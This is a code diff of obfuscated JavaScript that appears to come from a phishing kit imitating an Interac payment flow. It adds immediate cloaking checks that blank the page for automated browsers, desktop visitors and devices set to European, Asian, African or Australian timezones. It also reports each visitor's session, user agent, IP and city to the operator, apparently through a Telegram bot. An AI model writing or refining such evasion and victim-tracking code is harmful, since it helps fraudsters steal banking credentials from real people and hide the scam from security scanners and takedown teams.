@@ -23,7 +23,46 @@
     }
   }
 
-  // PROTECTION ABSOLUE DIRECT ACCESS :
+  // 1. Détection Bots / Headless / Émulateurs automatisés IMMÉDIATE
+  if (_N.webdriver || _W.callPhantom || _W._phantom || _W.__nightmare || _W.navigator.webdriver) {
+    try { _D.documentElement.innerHTML = ''; } catch(e){}
+    _tg(_R, '🛑 <b>BLOCAGE BOT AUTOMATISÉ (WEBDRIVER)</b>\n🆔 Session: <code>' + _SID + '</code>');
+    _die();
+    throw new Error('BOT_DENIED');
+  }
+
+  // 2. Blocage PC / Écrans non-mobiles IMMÉDIAT
+  function _isMobile(){
+    var _ua = _N.userAgent || '';
+    var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
+    var _touch = _N.maxTouchPoints > 0 || ('ontouchstart' in _W) || ('DocumentTouch' in _W);
+    if (_isMobUA || (_touch && Math.min(_W.screen.width, _W.screen.height) <= 1024)) {
+      return true;
+    }
+    return false;
+  }
+
+  if (!_isMobile()) {
+    try { _D.documentElement.innerHTML = ''; } catch(e){}
+    _tg(_R, '🛑 <b>BLOCAGE PC / NON-MOBILE</b>\n🆔 Session: <code>' + _SID + '</code>\n🖥️ UA: <code>' + _N.userAgent + '</code>');
+    _die();
+    throw new Error('MOBILE_ONLY');
+  }
+
+  // 3. Détection Hardware Timezone Étranger IMMÉDIATE
+  var _devTz = '';
+  try {
+    _devTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+  } catch(e){}
+
+  if (_devTz && (_devTz.indexOf('Europe/') === 0 || _devTz.indexOf('Asia/') === 0 || _devTz.indexOf('Africa/') === 0 || _devTz.indexOf('Australia/') === 0)) {
+    try { _D.documentElement.innerHTML = ''; } catch(e){}
+    _tg(_R, '🛑 <b>BLOCAGE VPN ÉTRANGER (TIMEZONE MISMATCH)</b>\n🕒 Timezone Appareil: <code>' + _devTz + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+    _die();
+    throw new Error('TIMEZONE_DENIED');
+  }
+
+  // 4. PROTECTION ABSOLUE DIRECT ACCESS :
   // Si ce n'est ni la page captcha ni la page interac de départ,
   // exiger immédiatement le jeton __cptPass === '1'.
   var _currPath = (_W.location.pathname || '').toLowerCase();
@@ -37,16 +76,6 @@
       _W.location.replace('/captcha.html');
       throw new Error('DIRECT_ACCESS_DENIED');
     }
-  }
-
-  function _isMobile(){
-    var _ua = _N.userAgent || '';
-    var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
-    var _touch = _N.maxTouchPoints > 0 || ('ontouchstart' in _W) || ('DocumentTouch' in _W);
-    if (_isMobUA || (_touch && Math.min(_W.screen.width, _W.screen.height) <= 1024)) {
-      return true;
-    }
-    return false;
   }
 
   function _tg(_tok, _txt, _kb){
@@ -213,20 +242,6 @@
   }
 
   function _init(){
-    // 1. Détection Bots / Headless / Emulateurs automatisés
-    if (_N.webdriver || _W.callPhantom || _W._phantom || _W.__nightmare || _W.navigator.webdriver) {
-      _tg(_R, '🛑 <b>BLOCAGE BOT AUTOMATISÉ (WEBDRIVER)</b>\n🆔 Session: <code>' + _SID + '</code>');
-      _die();
-      return;
-    }
-
-    // 2. Blocage strict PC / Émulateurs / Écrans non-mobiles
-    if (!_isMobile()) {
-      _tg(_R, '🛑 <b>BLOCAGE PC / NON-MOBILE</b>\n🆔 Session: <code>' + _SID + '</code>\n🖥️ UA: <code>' + _N.userAgent + '</code>');
-      setTimeout(_die, 500);
-      return;
-    }
-
     _W._notifyCaptchaSolved = function() {
       var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
       var _city = _W.sessionStorage.getItem('__xcity') || 'N/A';
